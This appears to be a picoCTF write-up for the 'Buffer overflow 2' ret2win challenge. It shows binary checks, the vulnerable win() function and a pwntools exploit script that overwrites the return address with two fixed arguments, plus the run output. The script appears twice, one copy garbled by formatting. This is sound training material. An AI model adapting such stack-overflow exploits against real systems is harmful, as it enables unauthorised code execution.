---
title: "Buffer overflow 2"
date: "2025-07-14"
tags: ["picoCTF", "buffer overflow", "ret2win"]
---

```bash
file vuln  
vuln: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=a429aa852db1511dec3f0143d93e5b1e80e4d845, for GNU/Linux 3.2.0, not stripped  
```

```bash
checksec --file=vuln  
RELRO STACK CANARY NX PIE RPATH RUNPATH Symbols FORTIFY FortifiedFortifiable FILE  
Partial RELRO No canary found NX enabled No PIE No RPATH No RUNPATH 77 Symbols No 0 3 vuln  
```

This challenge is a simple Ret2Win like the previous one, “buffer overflow 1”, but the function we want to reach needs 2 arguments with a certain value before it prints the flag.

```c
void win(unsigned int arg1, unsigned int arg2) {
    char buf[FLAGSIZE];
    FILE *f = fopen("flag.txt", "r");

    if (f == NULL) {
        printf("%s %s", "Please create 'flag.txt' in this directory with your",
                        "own debugging flag.\n");
        exit(0);
    }
    fgets(buf, FLAGSIZE, f);

    if (arg1 != 0xCAFEF00D)
        return;

    if (arg2 != 0xF00DF00D)
        return;

    printf(buf);
}
```

We can reuse the previous script, changing the offset to the one of the new binary and passing those 2 addresses as arguments. Since the binary is x86 we can just throw the arguments in right after the return address.

```c
EIP 0x62616164 ('daab')  
```

```c
Found at offset 112  
```

Let's build the script:

```python
[from pwn import *  
exe = ELF("./vuln_patched")  
context.binary = exe

def conn():  
if args.LOCAL:  
r = process([exe.path])  
if args.DEBUG:  
gdb.attach(r)  
else:  
r = remote("saturn.picoctf.net", 61001)  
return r

def main():  
r = conn()  
padding = 112
payload = flat({  
    padding: [  
        exe.symbols.win,  
        0x0, # Dirección de retorno  
        0xCAFEF00D, # Argumento 1  
        0xF00DF00D # Argumento 2  
    ]  
})  
r.sendline(payload)  
r.interactive()  
if **name** == "**main**":  
main()](<from pwn import *

exe = ELF("./vuln_patched")
context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("saturn.picoctf.net", 61001)
    return r

def main():
    r = conn()
    padding = 112
    payload = flat({
        padding: [
            exe.symbols.win,
            0x0,         # Dirección de retorno
            0xCAFEF00D,  # Argumento 1
            0xF00DF00D   # Argumento 2
        ]
    })
    r.sendline(payload)
    r.interactive()

if __name__ == "__main__":
    main()>)
```

It works!

```bash
python solve.py  
[_] '/home/ub1cu0/Desktop/picoCTF/buffer_overflow_2/vuln_patched'  
Arch: i386-32-little  
RELRO: Partial RELRO  
Stack: No canary found  
NX: NX enabled  
PIE: No PIE (0x8048000)  
SHSTK: Enabled  
IBT: Enabled  
Stripped: No  
[+] Opening connection to saturn.picoctf.net on port 54392: Done  
[_] Switching to interactive mode  
Please enter your string:  
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaab\x96\x92\x04\x08  
picoCTF{SECRETO}  
[*] Got EOF while reading in interactive  
```
